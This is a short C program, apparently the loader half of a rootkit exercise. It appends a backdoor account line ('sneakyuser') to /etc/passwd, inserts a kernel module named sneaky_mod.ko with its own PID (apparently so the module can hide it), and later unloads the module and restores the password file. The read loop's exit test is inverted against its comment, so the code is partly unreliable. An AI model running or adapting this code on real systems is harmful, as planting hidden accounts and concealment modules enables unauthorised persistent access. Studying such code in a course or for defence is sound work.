#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int main(){
    int pid = getpid();
    //1: print own process ID
    printf("sneaky_process pid = %d\n", pid);

    //2: copy /etc/passwd to /tmp/passwd, print a new line to the end of /etc/passwd
    system("cp /etc/passwd /tmp");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");

    //3: load the sneaky module
    char command[50];
    sprintf(command, "insmod sneaky_mod.ko pid=%d", pid);
    system(command);

    //4: enter a loop, reading a char at a time until a 'q' is received
    char input;
    while(1){
        if((input = getchar())!='q'){
            break;
        }
    }

    //5: unload the sneaky module: rmmod [modulename]
    system("rmmod sneaky_mod.ko");

    //6: restore the /etc/passwd file
    system("cp /tmp/passwd /etc");

    return EXIT_SUCCESS;
}